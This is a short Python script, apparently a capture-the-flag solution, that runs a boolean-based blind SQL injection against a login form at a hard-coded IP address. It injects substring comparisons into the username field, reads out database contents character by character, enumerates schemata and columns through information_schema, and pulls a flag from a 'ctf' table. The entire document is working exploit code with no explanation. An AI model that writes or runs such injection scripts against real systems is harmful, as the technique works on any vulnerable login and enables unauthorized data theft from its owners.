import requests
import string

r = requests.Session()

def get_target(target):
   	
	now_chr = 1
	add_chr = ""
	while True :
		flag = 0
		printable = string.printable
		for chr1 in printable :
			payload = {
				'username': "admin' or substring(("+target+"),"+str(now_chr)+",1)='"+chr1+"';",
				'password': 'd'

			}

			index = r.post('http://140.134.25.138:10015/login.php',data=payload)
			if (index.text.find("Success"))>0:
				add_chr += chr1
				flag = 1
				break
		if chr1 == " " or flag == 0:
			break
		now_chr += 1
	return add_chr
def get_all(target):
	count = 0
	while True:
		a = get_target(target+" LIMIT "+str(count)+",1")
		print a
		if a =="":
			break
		count += 1

print get_target('database()')
print "----get all table---"
get_all("select schema_name FROM information_schema.schemata")
print "----get ctf table column_name---"
get_all("select column_name  FROM information_schema.columns WHERE table_name = 'ctf'")
print "---get flag---"
get_all('SELECT flag FROM ctf')


